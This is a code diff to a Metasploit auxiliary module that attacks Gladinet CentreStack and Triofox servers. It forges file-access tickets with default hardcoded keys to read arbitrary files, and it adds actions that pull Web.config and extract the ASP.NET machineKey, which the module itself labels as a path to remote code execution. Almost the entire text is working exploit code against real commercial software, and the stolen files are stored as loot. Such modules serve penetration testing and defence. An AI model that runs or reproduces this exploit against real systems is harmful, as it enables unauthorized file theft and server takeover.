@@ -4,7 +4,6 @@
 ##
 
 require 'openssl'
-require 'base64'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
@@ -57,13 +56,19 @@ class MetasploitModule < Msf::Auxiliary
           'Stability' => [CRASH_SAFE],
           'SideEffects' => [IOC_IN_LOGS],
           'Reliability' => []
-        }
+        },
+        'Actions' => [
+          ['READ_FILE', { 'Description' => 'Read an arbitrary file from the target' }],
+          ['EXTRACT_MACHINEKEY', { 'Description' => 'Read Web.config and extract the machineKey for RCE' }]
+        ],
+        'DefaultAction' => 'EXTRACT_MACHINEKEY'
       )
     )
 
     register_options([
       OptString.new('TARGETURI', [true, 'The base path to the Gladinet CentreStack or Triofox application', '/']),
       OptString.new('FILEPATH', [true, 'Absolute path to the file to read on the target', 'C:\\Program Files (x86)\\Gladinet Cloud Enterprise\\root\\Web.config']),
+      OptEnum.new('PRODUCT', [true, 'Target product type', 'CentreStack', ['CentreStack', 'Triofox']]),
       OptString.new('SYSKEY', [true, 'SysKey (32 bytes) in hex format', DEFAULT_SYS_KEY]),
       OptString.new('SYSKEY1', [true, 'SysKey1 (16 bytes) in hex format', DEFAULT_SYS_KEY1])
     ])
@@ -122,7 +127,7 @@ class MetasploitModule < Msf::Auxiliary
     cipher.key = sys_key
     cipher.iv = sys_key1
     encrypted = cipher.update(plaintext) + cipher.final
-    Base64.strict_encode64(encrypted).tr('+/', ':|')
+    Rex::Text.encode_base64(encrypted).tr('+/', ':|')
   end
 
   def check
@@ -135,41 +140,42 @@ class MetasploitModule < Msf::Auxiliary
     Exploit::CheckCode::Appears("Version #{version} detected, attempting ticket forge anyway")
   end
 
-  def run
-    filepath = datastore['FILEPATH']
+  def storage_endpoint
+    # CentreStack and Triofox use different paths
+    case datastore['PRODUCT']
+    when 'Triofox'
+      normalize_uri(target_uri.path, 'servlets', 'filesvr.dn')
+    else
+      normalize_uri(target_uri.path, 'storage', 'filesvr.dn')
+    end
+  end
 
+  def default_webconfig_path
+    case datastore['PRODUCT']
+    when 'Triofox'
+      'C:\\Program Files (x86)\\Triofox\\root\\Web.config'
+    else
+      'C:\\Program Files (x86)\\Gladinet Cloud Enterprise\\root\\Web.config'
+    end
+  end
+
+  def read_file_via_ticket(filepath)
     print_status("Forging access ticket for file: #{filepath}")
     ticket = forge_ticket(filepath)
 
     print_good("Forged access ticket: #{ticket}")
 
-    print_status('Sending request to /storage/filesvr.dn')
+    print_status("Sending request to #{storage_endpoint}")
     res = send_request_cgi({
       'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, 'storage', 'filesvr.dn'),
+      'uri' => storage_endpoint,
       'vars_get' => { 't' => ticket }
     })
 
     unless res&.code == 200
       print_error("Failed to read file. HTTP response code: #{res&.code}")
-      return
+      return nil
     end
-
-    print_good("Successfully read file: #{filepath}")
-    print_line
-    print_line(res.body)
-    print_line
-
-    fname = File.basename(filepath)
-    path = store_loot(
-      'gladinet.file',
-      'text/plain',
-      datastore['RHOST'],
-      res.body,
-      fname,
-      'File read from Gladinet via forged access ticket'
-    )
-    print_good("File saved to: #{path}")
 
     ticket_path = store_loot(
       'gladinet.ticket',
@@ -181,6 +187,66 @@ class MetasploitModule < Msf::Auxiliary
     )
     print_good("Access ticket saved to: #{ticket_path}")
 
-    handle_machinekey_extraction(res.body, filepath, 'MachineKey extracted from Gladinet Web.config')
+    res.body
+  end
+
+  def run
+    case action.name
+    when 'READ_FILE'
+      run_read_file
+    when 'EXTRACT_MACHINEKEY'
+      run_extract_machinekey
+    end
+  end
+
+  def run_read_file
+    filepath = datastore['FILEPATH']
+    file_content = read_file_via_ticket(filepath)
+    return if file_content.nil?
+
+    print_good("Successfully read file: #{filepath}")
+    print_line
+    print_line(file_content)
+    print_line
+
+    fname = File.basename(filepath)
+    path = store_loot(
+      'gladinet.file',
+      'text/plain',
+      datastore['RHOST'],
+      file_content,
+      fname,
+      'File read from Gladinet via forged access ticket'
+    )
+    print_good("File saved to: #{path}")
+  end
+
+  def run_extract_machinekey
+    filepath = datastore['FILEPATH']
+    # Use default Web.config path if the user hasn't changed FILEPATH
+    if filepath == 'C:\\Program Files (x86)\\Gladinet Cloud Enterprise\\root\\Web.config'
+      filepath = default_webconfig_path
+    end
+
+    file_content = read_file_via_ticket(filepath)
+    return if file_content.nil?
+
+    print_good("Successfully read file: #{filepath}")
+    print_line
+    print_line(file_content)
+    print_line
+
+    fname = File.basename(filepath)
+    path = store_loot(
+      'gladinet.file',
+      'text/plain',
+      datastore['RHOST'],
+      file_content,
+      fname,
+      'File read from Gladinet via forged access ticket'
+    )
+    print_good("File saved to: #{path}")
+
+    handle_machinekey_extraction(file_content, filepath, 'MachineKey extracted from Gladinet Web.config')
   end
 end
